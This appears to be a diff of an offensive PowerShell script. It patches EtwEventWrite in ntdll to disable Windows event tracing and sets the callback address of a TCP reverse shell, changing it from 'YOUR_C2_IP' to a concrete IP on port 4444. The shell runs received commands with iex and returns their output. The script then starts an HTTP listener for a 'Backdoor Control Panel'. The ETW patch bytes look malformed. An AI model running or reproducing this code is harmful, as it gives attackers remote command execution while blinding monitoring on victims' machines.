@@ -19,7 +19,7 @@ $etwpatch = @"
 using System; using System.Runtime.InteropServices; public class EtwDisable { [DllImport("ntdll.dll")] public static extern uint EtwEventWrite(); public static void Patch() { var addr = (ulong)EtwEventWrite; Marshal.Copy(new byte[] {0x48,0xC7,0xC0}, 0, (IntPtr)(addr+9), 4); } }
 "@;[Reflection.Assembly]::Load([Convert]::FromBase64String('...')).GetType('EtwDisable').GetMethod('Patch').Invoke($null,$null)
 
-$client = New-Object System.Net.Sockets.TCPClient('YOUR_C2_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+$client = New-Object System.Net.Sockets.TCPClient('192.168.1.15',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 
 $listener = New-Object System.Net.HttpListener; $listener.Prefixes.Add("http://*:8080/"); $listener.Start(); $html = @"
 <!DOCTYPE html><html><body><h1>Backdoor Control Panel</h1>
